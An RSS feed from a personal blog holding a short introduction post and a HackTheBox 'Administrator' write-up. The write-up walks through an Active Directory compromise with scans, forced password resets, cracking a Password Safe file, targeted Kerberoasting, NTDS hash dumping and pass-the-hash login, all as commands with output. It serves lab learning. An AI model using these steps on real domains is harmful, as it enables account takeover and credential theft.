<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on SolarSpectre</title><link>https://solarspectre.github.io/post/</link><description>Recent content in Posts on SolarSpectre</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 01 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://solarspectre.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>Hello World</title><link>https://solarspectre.github.io/p/hello-world/</link><pubDate>Sun, 09 Feb 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/hello-world/</guid><description>&lt;img src="https://solarspectre.github.io/p/hello-world/cover.jpg" alt="Featured image of post Hello World" />&lt;h1 id="-welcome-to-my-blog">🏴‍☠️ Welcome to My Blog!
&lt;/h1>&lt;p>This is my first post! I&amp;rsquo;ll be writing &lt;strong>writeups&lt;/strong> for machines I solve on &lt;strong>HackTheBox&lt;/strong>, &lt;strong>TryHackMe&lt;/strong>, and other platforms.&lt;/p>
&lt;h2 id="-about-me">🧐 About Me
&lt;/h2>&lt;ul>
&lt;li>👨‍💻 &lt;strong>Software Developer&lt;/strong> | 🎓 Uni Student (20 y/o)&lt;/li>
&lt;li>📖 Studying &lt;strong>software development&lt;/strong> &amp;amp; &lt;strong>ethical hacking&lt;/strong>&lt;/li>
&lt;li>🔍 Solving &lt;strong>machines&lt;/strong> on THM &amp;amp; HTB&lt;/li>
&lt;li>🎥 Learning from:
&lt;ul>
&lt;li>&lt;a class="link" href="https://www.youtube.com/c/S4vitar" target="_blank" rel="noopener"
>s4vitar&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.youtube.com/c/JohnHammond010" target="_blank" rel="noopener"
>John Hammond&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.youtube.com/@LowLevelTV" target="_blank" rel="noopener"
>Low Level Learning&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="-hobbies">🎬 Hobbies
&lt;/h2>&lt;p>📺 Watching &lt;strong>anime&lt;/strong>, TV series, and movies in my free time.&lt;br>
🏀 My favorite sport is &lt;strong>basketball&lt;/strong>&lt;/p></description></item><item><title>HTB Administrator - Writeup</title><link>https://solarspectre.github.io/p/htb-administrator-writeup/</link><pubDate>Tue, 01 Apr 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/htb-administrator-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/cover.jpg" alt="Featured image of post HTB Administrator - Writeup" />&lt;h3 id="enumeration">Enumeration
&lt;/h3>&lt;p>Let&amp;rsquo;s start with a scan to all ports:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">sudo nmap -sS -p- --open --min-rate &lt;span class="m">5000&lt;/span> -vvv -n -Pn 10.10.11.61 -oG allPorts
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Here are the open ports&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">88/tcp open kerberos-sec syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">389/tcp open ldap syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">464/tcp open kpasswd5 syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">593/tcp open http-rpc-epmap syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">636/tcp open ldapssl syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3268/tcp open globalcatLDAP syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3269/tcp open globalcatLDAPssl syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5985/tcp open wsman syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">9389/tcp open adws syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">47001/tcp open winrm syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>once it&amp;rsquo;s finished, grep the ports and copy them to later scan them with nmap looking out for the versions of the services hosted.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo nmap -sC -sV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.11.42 -oN targeted
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.95 &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2025-04-11 16:52 EDT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.11.42
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.26s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp Microsoft ftpd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ftp-syst:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ SYST: Windows_NT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain Simple DNS Plus
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">88/tcp open kerberos-sec Microsoft Windows Kerberos &lt;span class="o">(&lt;/span>server time: 2025-04-12 03:52:41Z&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn Microsoft Windows netbios-ssn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: administrator.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">464/tcp open kpasswd5?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">636/tcp open tcpwrapped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3268/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: administrator.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3269/tcp open tcpwrapped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span class="o">(&lt;/span>SSDP/UPnP&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Microsoft-HTTPAPI/2.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Not Found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">9389/tcp open mc-nmf .NET Message Framing
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span class="o">(&lt;/span>SSDP/UPnP&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Microsoft-HTTPAPI/2.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Not Found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Host: DC&lt;span class="p">;&lt;/span> OS: Windows&lt;span class="p">;&lt;/span> CPE: cpe:/o:microsoft:windows
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>add the domain to your /etc/hosts file&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">10.10.11.61 administrator.htb dc.administrator.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Run netexec with the credentials from hackthebox&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">nxc winrm 10.10.11.42 -u Olivia -p ichliebedich
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WINRM 10.10.11.42 &lt;span class="m">5985&lt;/span> DC &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> administrator.htb&lt;span class="se">\o&lt;/span>livia:ichliebedich &lt;span class="o">(&lt;/span>Pwn3d!&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Login to the machine using evil-winrm and run SharpHound to look for Attack paths&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.42 -u olivia -p &lt;span class="s1">&amp;#39;ichliebedich&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">upload SharpHound.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Once you ingested the data in bloodhound, you can see that olivia has GenericAll meaning she has full control over michael&amp;rsquo;s account&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/1.png"
width="768"
height="193"
srcset="https://solarspectre.github.io/p/htb-administrator-writeup/1_hu_5452d1cb76675978.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/1_hu_aff7a081dde9a9c1.png 1024w"
loading="lazy"
alt="Image 1"
class="gallery-image"
data-flex-grow="397"
data-flex-basis="955px"
>
And Michael Can ForceChangePassword of Benjamin&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/2.png"
width="768"
height="164"
srcset="https://solarspectre.github.io/p/htb-administrator-writeup/2_hu_7b78de711b72a0e2.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/2_hu_67524f6fadb9ffaf.png 1024w"
loading="lazy"
alt="Image 2"
class="gallery-image"
data-flex-grow="468"
data-flex-basis="1123px"
>
To reset the password for these users you can use this commands&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">net rpc password &lt;span class="s2">&amp;#34;michael&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;P@ssw00rd!231!!!&amp;#39;&lt;/span> -U &lt;span class="s2">&amp;#34;administrator.htb&amp;#34;&lt;/span>/&lt;span class="s2">&amp;#34;Olivia&amp;#34;&lt;/span>%&lt;span class="s1">&amp;#39;ichliebedich&amp;#39;&lt;/span> -S dc.administrator.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net rpc password &lt;span class="s2">&amp;#34;benjamin&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;P@ssw00rd!555!!!&amp;#39;&lt;/span> -U &lt;span class="s2">&amp;#34;administrator.htb&amp;#34;&lt;/span>/&lt;span class="s2">&amp;#34;michael&amp;#34;&lt;/span>%&lt;span class="s1">&amp;#39;P@ssw00rd!231!!!&amp;#39;&lt;/span> -S dc.administrator.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="user-flag">User Flag
&lt;/h3>&lt;p>With these accounts you can look for access to other services like smb or ftp&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">nxc ftp 10.10.11.42 -u benjamin -p &lt;span class="s1">&amp;#39;P@ssw00rd!555!!!&amp;#39;&lt;/span> --ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FTP 10.10.11.42 &lt;span class="m">21&lt;/span> 10.10.11.42 &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Banner: Microsoft FTP Service
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FTP 10.10.11.42 &lt;span class="m">21&lt;/span> 10.10.11.42 &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> benjamin:P@ssw00rd!555!!!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FTP 10.10.11.42 &lt;span class="m">21&lt;/span> 10.10.11.42 &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Directory Listing
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FTP 10.10.11.42 &lt;span class="m">21&lt;/span> 10.10.11.42 10-05-24 09:13AM &lt;span class="m">952&lt;/span> Backup.psafe3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nxc ftp 10.10.11.42 -u benjamin -p &lt;span class="s1">&amp;#39;P@ssw00rd!555!!!&amp;#39;&lt;/span> --get Backup.psafe3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>this is a password database file that&amp;rsquo;s protected by a master password, to crack that password you can use john the ripper&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">pwsafe2john Backup.psafe3 &amp;gt; psafe3.hash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">john psafe3.hash --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/rockyou.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using default input encoding: UTF-8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Loaded &lt;span class="m">1&lt;/span> password &lt;span class="nb">hash&lt;/span> &lt;span class="o">(&lt;/span>pwsafe, Password Safe &lt;span class="o">[&lt;/span>SHA256 256/256 AVX2 8x&lt;span class="o">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>iteration count&lt;span class="o">)&lt;/span> is &lt;span class="m">2048&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Will run &lt;span class="m">2&lt;/span> OpenMP threads
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Press &lt;span class="s1">&amp;#39;q&amp;#39;&lt;/span> or Ctrl-C to abort, almost any other key &lt;span class="k">for&lt;/span> status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tekieromucho &lt;span class="o">(&lt;/span>Backu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>with this password, open the database with passwordsafe&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">sudo apt install passwordsafe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pwsafe Backup.psafe3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>you can login as emily with evil-winrm&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.42 -u emily -p PASSWORD
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\e&lt;/span>mily&lt;span class="se">\D&lt;/span>esktop&amp;gt; &lt;span class="nb">type&lt;/span> user.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">XXXXXXXXXXXXXXXXXXXXXXXXXXX
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="root-flag">Root Flag
&lt;/h3>&lt;p>Looking for attack paths as emily in bloodhound you can find that she has GenericWrite access on Ethan&amp;rsquo;s account, which means we can use this to do a targeted kerberoast attack to obtain the hash of ethan&amp;rsquo;s account and crack it with johntheripper&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/3.png"
width="768"
height="201"
srcset="https://solarspectre.github.io/p/htb-administrator-writeup/3_hu_c44c08755ace5602.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/3_hu_6c4b917d3779a5.png 1024w"
loading="lazy"
alt="Image 3"
class="gallery-image"
data-flex-grow="382"
data-flex-basis="917px"
>
Use faketime to sync your time with the DC and targetedKerberoast to execute the attack
&lt;a class="link" href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank" rel="noopener"
>https://github.com/ShutdownRepo/targetedKerberoast&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">faketime &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="k">$(&lt;/span>ntpdate -q dc.administrator.htb &lt;span class="p">|&lt;/span> grep -oP &lt;span class="s1">&amp;#39;\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}&amp;#39;&lt;/span>&lt;span class="k">)&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> python targetedKerberoast.py -d &lt;span class="s2">&amp;#34;administrator.htb&amp;#34;&lt;/span> -u &lt;span class="s2">&amp;#34;emily&amp;#34;&lt;/span> -p &lt;span class="s2">&amp;#34;XXXXXXXXXXXXXXXXXXXXX&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And crack the hash with john&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">john hash.txt --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/rockyou.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now that we have access to ethan&amp;rsquo;s account, we can dump the hashes for the administrator and obtain the root flag&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/4.png"
width="768"
height="271"
srcset="https://solarspectre.github.io/p/htb-administrator-writeup/4_hu_9a19eebed6ee0f32.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/4_hu_5a21c04038ef84d7.png 1024w"
loading="lazy"
alt="Image 4"
class="gallery-image"
data-flex-grow="283"
data-flex-basis="680px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">nxc smb 192.168.1.100 -u ethan -p &lt;span class="s1">&amp;#39;XXXXXXXXXXXXXX&amp;#39;&lt;/span> --ntds --users administrator
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Login with evil-winrm as administrator and get the flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.42 -u administrator -H XXXXXXXXXXXXXXXXXXXXXXXXXX
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop&amp;gt; &lt;span class="nb">type&lt;/span> root.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="conclusion">Conclusion
&lt;/h3>&lt;p>This machine covers topics like Kerberoasting, bloodhound, DCSync / Dump Hashes, GenericWrite, GenericAll,Password Cracking and Password Database leak&lt;/p>
